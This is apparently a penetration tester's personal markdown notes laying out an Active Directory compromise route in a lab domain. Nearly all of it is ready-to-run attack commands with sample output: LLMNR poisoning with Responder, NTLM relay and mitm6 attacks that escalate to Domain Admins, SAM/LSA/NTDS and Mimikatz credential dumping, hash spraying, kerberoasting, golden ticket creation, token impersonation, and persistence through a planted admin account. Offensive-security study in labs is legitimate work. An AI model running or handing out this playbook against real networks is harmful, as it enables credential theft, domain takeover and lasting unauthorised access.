# Typical Internal AD compromise route
## First Strike (SMB)
1. **Obtain an NTLMv2 Hash via Responder:** `sudo responder -I eth0 -dw`
	- LLMNR Poisoning via `responder` captures NTLMv2 hashes whenever any user tries accessing a machine/file/share and mistypes the IP or hostname.
		- Great to run when computers are logging in, like 8AM, or lunchtime.
		- (Reminder) Entire Hash format required: `username::DOMAIN:string:string:string`
		- Attempt cracking NTLMv2 hash: `hashcat -m 5600 luvrgirl.ntlmv2hashes /usr/share/wordlists/rockyou.txt`
	- **If the hash is not crackable, move to step 2.**

2. **Check for SMB signing requirements with [NetExec](https://www.netexec.wiki/):** `nxc smb 10.0.2.0/24 --gen-relay targets.txt`
	- **Relay to LDAP:** Auto-dump domain users, groups, and computers: `ntlmrelayx.py -t ldap://DC_IP --add-computer workstation20 --delegate-access`
		- Add user to **Domain Admins** or other privileged group: `ntlmrelayx.py -t ldap://DC_IP --escalate-user USERNAME`

3. **Dump Local Security Authority (LSA):** `nxc smb 10.0.2.9 -u luvrgirl -p Password --lsa` 
	- Attempt cracking DCC2 Hashes: `.\hashcat.exe -m 2100 hash.txt rockyou.txt -O`
		- DCC2 Hash format must be as such in file: `$DCC2$10240#administrator#c7154f935b7d1ace4c1d72bd4fb7889c`

4. **Dump Security Account Manager:** `nxc smb 10.0.2.9 -u luvrgirl -p Password1 --sam`

5. **Move Laterally:** with NetExec
	- Password Spraying: `nxc smb 10.0.2.0/24 -u luvrgirl -p 'Password1'` 
	- *Check for Local Admin Password reuse* via Hash Spraying: `nxc smb 10.0.2.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 --local-auth`  
---
# AD Initial Attack Vectors
## Responder
`sudo responder -I eth0 -dw`
> Capture NTLMv2 hashes: WPAD rogue proxy server w/ DHCP broadcast request answering

If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network.
## SMB Relay via ntlmrelayx
> If you cannot crack hashes gathered w/ Responder, you can relay those hashes to attempt gaining access

**Steps**:
1. Identify hosts without SMB signing *required*: `nmap --script=smb2-security-mode.nse -p445 <IP range>` or `nxc smb 10.0.2.0/24 --gen-relay targets.txt`
>> Relayed user credentials should be admin on machine for real value
2. Ensure Responder is configured to have SMB and HTTP capturing **OFF**, this enables relaying: `sudo nano /etc/responder/Responder.conf`
3. Run responder: `sudo responder -I eth0 -dw`
4. Run ntlmrelay: `ntlmrelayx.py -tf targets.txt -smb2support`
	- Dumps SAM/Captures NTLMv1 hashes
		- Optionally, run commands directly: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
## MITM6 - Create a shadow user
>If IPv6 is not in use in the environment, you can attack LDAP using ntlmrelayx/mitm6 combo.

1. Start ntlmrelayx: `ntlmrelayx.py -6 -t ldaps://10.0.2.7 -wh wpad.lifeline.local -l lootme`
2. Start mitm6: `sudo mitm6 -d lifeline.local`

When you see ACE and ACL mentioned, you've likely compromised the DC and a custom user would then be built by MITM6.

Look for lines like `Adding new user with username`: 
```
TypeName: {'ACCESS_ALLOWED_ACE'}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00=\xc8\xc0M\xd0w7tS\xd3\x92\xe2\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Adding new user with username: qmsgntJvqi and password: V&Vr|.3[U67`C~Y result: OK
```
# AD Internal Enumeration with Compromised Credentials
## Bloodhound & Neo4j
> **REQUIRES**: compromised domain user (Active Directory username & password)

Steps: 
1. Update Bloodhound via APT or Pip, whichever it was installed with
2. Run Neo4j: `sudo neo4j console`
	1. Ensure you're logged in
3. Run Bloodhound: `sudo bloodhound`
4. Use bloodhound-python to enumerate the active directory environment via compromised credentials: `sudo bloodhound-python -d LIFELINE.local -u mmeow -p Password1 -ns 10.0.2.7 -c all` *(nameserver must be domain)*
5. Upload all JSON files created to Bloodhound's web interface. You're now ready to visualize the environment for enumeration
# AD Post-Compromise Attacks
## File Transfers
#### Host
- HTTP: `python3 -m http.server 8080`
- FTP: `python3 -m pyftpdlib -p 21`
#### Grab
- Certutil: `certutil.exe --urlcache -f http://10.0.2.15/file.txt file.txt`
- Wget: `wget 10.0.2.15/file.txt`
## Dump Hashes
> Requires compromised user account's password
### NetExec
1. Dump SAM: `nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam`
2. Dump LSA: `nxc smb 10.0.2.9 -u luvrgirl -p Password --lsa`
3. Dump NTDS.dit
> Requires Domain Admin or Local Admin Privileges on target Domain Controller
```
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
```
[1](https://www.netexec.wiki/smb-protocol/obtaining-credentials)
#### Credential Dumping w/ Meterpreter Kiwi (Mimikatz)
> This girl is known by every AV, but if you can freely run it...

**Steps**:
1. Set privileges: `privilege::debug`
	1. Expected: `Privilege '20' OK`
	2. (Optional) Check command list: `sekurlsa`
2. Dump credentials: `sekurlsa::logonPasswords`
##### via Meterpreter
**Steps to execute within a meterpreter shell**:
1. Load Mimikatz: `load kiwi`
2. Set privileges: `kiwi_cmd privilege::debug`
3. Dump credentials: `kiwi_cmd sekurlsa::logonPasswords`
>>> If error: `ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process`, you may wish to find a way to run Mimikatz.exe
## Pass the Password/Hash
### NetExec
**Password spraying:** `crackmapexec smb 10.0.2.0/24 -u mmeow -d LIFELINE.local -p Password1`
> Check for local admin access of a given account

**List Local Administrators:** `nxc smb 10.0.2.9 -u 'daethyra' -H 'hash' --local-auth -x 'net localgroup administrators'`
# Persistence
### Shadow user
>Requires having Administrator/SYSTEM access

1. `net user /add <username> <password> /domain`
2. `net group "Domain Admins" <username> /ADD /DOMAIN`
### Golden Tickets
You may wish to simply review [[Golden Diamond and Sapphire Attacks]] for technological details.
#### Dump Service Principal Names 
> Fetch Service Principal Names that are associated with normal user accounts, NOT machines. User generated SPNs are based on user-created  passwords, which means they're weaker, which means they can actually be cracked.

`sudo GetUserSPNs.py LIFELINE.local/mmeow:Password1 -dc-ip 10.0.2.7 -request`
- In my lab, this dumped out a kerberoast ticket for the SQLService account which I then cracked via Hashcat(`hashcat -m 13100 kbr.txt /usr/share/wordlists/rockyou.txt`)
#### Create Golden Kerberos Ticket via Meterpreter
> The following workflow requires a Meterpreter session to be followed exactly as written

**Steps**:
1. `load kiwi`
2. `golden_ticket_create -d LIFELINE.local -k 43460d636f269c709b20049cee36ae7a -s S-1-5-21-1304479805-1949792208-3801273171 -u daethyra -t goldenkrb.ticket`
#### Find Domain SID

`nxc ldap 10.0.2.7 -u daethyra -p Password123 --get-sid`
- Running with `-k` flag, [as shown here](https://www.netexec.wiki/ldap-protocol/find-domain-sid), repeatedly failed to extract the SID
#### Token Impersonation w/ Incognito via Meterpreter
It may be helpful to check which user you are when first landing in a Meterpreter shell.
**Meterpreter shell steps**:
>Requires a user be logged in
1. `load incognito`
2. `list_tokens -u`
3. `impersonate_token <domain>\\<user>`
>>>Requires double backslash to escape the character

---
# Resources
1. https://www.netexec.wiki/smb-protocol/obtaining-credentials
2. 


#windows #meterpreter #lateral-movement #persistence #mimikatz #security-account-manager #local-security-authority #sam #lsa #netexec #domain-sid #kerberos #kerberoasting 